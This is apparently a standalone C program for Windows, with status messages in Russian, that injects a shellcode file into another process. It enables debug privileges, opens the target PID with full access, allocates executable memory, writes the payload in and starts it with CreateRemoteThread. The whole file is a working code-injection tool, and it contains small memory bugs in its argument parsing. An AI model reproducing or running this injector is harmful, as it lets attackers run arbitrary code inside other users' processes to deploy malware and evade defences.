#include <Windows.h>
#include <stdio.h>
#include <locale.h>

#pragma warning (disable: 4996)

#define ARGC_MIN 5
#define ARGC_MAX 7

#define PID "--pid"
#define PAYLOAD "--payload"
#define OUTPUT "--output"
#define HELP "--help"

FILE* file;

typedef struct injection_data
{
	char* payload_file;
	char* output_file;
	DWORD pid;
} INJECTION_DATA, * PINJECTION_DATA;


void help_print(char* first_argv)
{
	fprintf(file, "   Usage: %s <options> <param> [, <param>, ...]\n\n", first_argv);
	fprintf(file, "   Options:\n");
	fprintf(file, "\t%s\t\t\t\t: Process identifator\n", PID);
	fprintf(file, "\t%s\t\t\t: File with the injection code\n", PAYLOAD);
	fprintf(file, "\t%s\t\t\t: File with result of work\n", OUTPUT);
	fprintf(file, "\t%s\t\t\t\t: Show this help\n", HELP);
	fprintf(file, "\n   Example:\n");
	fprintf(file, "\t%s --pid 12345 --payload hack.txt --output result.txt\n", first_argv);
}

void fatal_err()
{
	DWORD code = GetLastError();
	fprintf(file, "ошибка, код:\t[%d]\n", code);
	fprintf(file, "\nВНЕДРЕНИЕ КОДА ЗАВЕРШИЛОСЬ ОШИБКОЙ\n");
	exit(code);
}


INJECTION_DATA get_all_argvs(int argc, char* argv[])
{
	int pid = 0;
	char* pPayloadFile = NULL;
	char* pOutputFile = NULL;
	INJECTION_DATA to_return;
	memset(&to_return, 0, sizeof(to_return));
	for (size_t i = 0; i < argc; i++)
	{
		if (strcmp(PID, argv[i]) == 0)
			pid = atoi(argv[i + 1]);

		if (strcmp(PAYLOAD, argv[i]) == 0)
		{
			pPayloadFile = (char*)malloc(strlen(argv[i + 1]));
			strcpy(pPayloadFile, argv[i + 1]);
		}

		if (strcmp(OUTPUT, argv[i]) == 0)
		{
			pOutputFile = (char*)malloc(strlen(argv[i + 1]));
			strcpy(pOutputFile, argv[i + 1]);
		}
	}

	to_return.output_file = pOutputFile;
	to_return.payload_file = pPayloadFile;
	to_return.pid = pid;
	return to_return;
}



int main(int argc, char* argv[])
{
	setlocale(LC_ALL, "rus");

	file = stdout;
	if (argc < ARGC_MIN || argc > ARGC_MAX)
	{
		help_print(argv[0]);
		exit(ERROR);
	}
	INJECTION_DATA data_for_injection = get_all_argvs(argc, argv);


	if  (data_for_injection.output_file != NULL && strlen(data_for_injection.output_file) > 0)
		file = fopen(data_for_injection.output_file, "w");

	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES priv = { 0 };
	fprintf(file, "[ 0 ] Получение привилегий отладчика:\n");

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		priv.PrivilegeCount = 1;
		priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
			if (AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL))
				fprintf(file, "получены привилегии отладчика\n");
			else fprintf(file, "привилегии отладчкика не получены\n");
		CloseHandle(hToken);
	}


	fprintf(file, "1. Попытка открыть процесс %d со всеми правами доступа: ", data_for_injection.pid);
	auto hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, data_for_injection.pid);
	if (!hProc)
		fatal_err();
	fprintf(file, "процесс открыт, дескриптор: %d\n", hProc); 

	fprintf(file, "2. Попытка выделения % байт памяти в открытом процессе: ");
	DWORD memory_requirments = 4096;
	auto pAllocated = VirtualAllocEx(hProc,NULL,memory_requirments,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pAllocated)
		fatal_err();

	MEMORY_BASIC_INFORMATION mbi;
	memset(&mbi, NULL, sizeof(mbi));
	VirtualQueryEx(hProc, pAllocated, &mbi, sizeof(mbi));
	DWORD RegionSize = mbi.RegionSize;
	fprintf(file, "память выделена по адресу 0x%p | размер %d байт\n", pAllocated, RegionSize);

	fprintf(file, "3. Попытка открыть файл %s на чтение: ", data_for_injection.payload_file);
	auto hFile = CreateFileA(data_for_injection.payload_file, GENERIC_READ | GENERIC_WRITE, NULL, NULL,
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if ((hFile == NULL) || (hFile == INVALID_HANDLE_VALUE))
		fatal_err();
	fprintf(file, "файл открыт | дескриптор %d\n", hFile);

	fprintf(file, "4. Загрузка файла в память текущего процесса: ");
	auto FileSize = GetFileSize(hFile, NULL);
	DWORD Readen = 0;
	auto pHeap = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, FileSize);
	ReadFile(hFile, pHeap, FileSize, &Readen, NULL);
	if (Readen < 1)
		fatal_err();
	fprintf(file, "файл загружен | размер файла %d байт | загружено в память %d байт\n", FileSize, Readen);

	SIZE_T Written = 0;
	fprintf(file, "5. Запись файла по адресу 0x%p в процесс  %d: ", pAllocated, data_for_injection.pid);
	WriteProcessMemory(hProc, pAllocated, pHeap, FileSize, &Written);
	if (Written < 1)
		fatal_err();
	fprintf(file, "файл записан успешно | записано %d байт\n", Written);


	DWORD id_thread = 0;
	fprintf(file, "6. Запуск внедренного кода в отдельном потоке: ");
	CreateRemoteThread(hProc, NULL, 1024 * 1024, (LPTHREAD_START_ROUTINE)pAllocated, NULL, NULL, &id_thread);
	if (id_thread == 0)
		fatal_err();
	fprintf(file, "код запущен | идентификатор потока %d\n", id_thread);

	fprintf(file, "\nВНЕДРЕНИЕ КОДА ПРОВЕДЕНО УСПЕШНО\n");

	Sleep(2000);
	CloseHandle(hProc);
	CloseHandle(hFile);
	VirtualFree(pAllocated, RegionSize, MEM_RELEASE | MEM_DECOMMIT);
	return 0;

}
